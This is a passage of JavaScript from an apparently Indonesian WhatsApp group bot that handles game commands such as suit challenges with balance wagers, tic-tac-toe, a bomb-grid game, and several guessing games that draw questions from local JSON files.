if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return reply795(`Selesaikan suit mu yang sebelumnya`)
mark = `0@s.whatsapp.net`
if (!froms) return reply795(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return reply795(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
let poin = 1000
let poin_lose = 1000
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await reply795(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit dengan taruhan Saldo Rp. 2,000\n\n*Kirim (gas/gamau)* untuk bermain\n\n*Hadiah Pemenang :* Rp. 2,000\n*Hukuman Kalah :* - Rp. 2,000`),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) alice.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (from in tictactoe) return reply(`Masih ada game yang blum selesai`)
if (!froms) return reply795(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return reply795(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return reply795(`Sad amat main ama diri sendiri`)
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
var hadiah = randomNomor(10, 20)
await reply795(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (!m.isGroup) return onlyGroup()
if (!(from in tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break
case 'petakbom':
if (!global.game) return reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (sender in petakbom) return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await reply795(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
break
case 'delpetakbom':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (!(sender in petakbom)) return reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
reply(`Petakbom di akhiri, hadiah Rp. 0`)
break
case 'tebakgambar':
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await alice.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar[from]) reply795(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await alice.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) reply795(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return reply795('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await alice.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {alice.sendteks(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) reply795(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
if(!isGroup) return onlyGroup()
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) reply795(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
case 'asahotak':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await reply795(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) reply795(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
if(!isGroup) return onlyGroup()
if (!global.game) return reply795(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
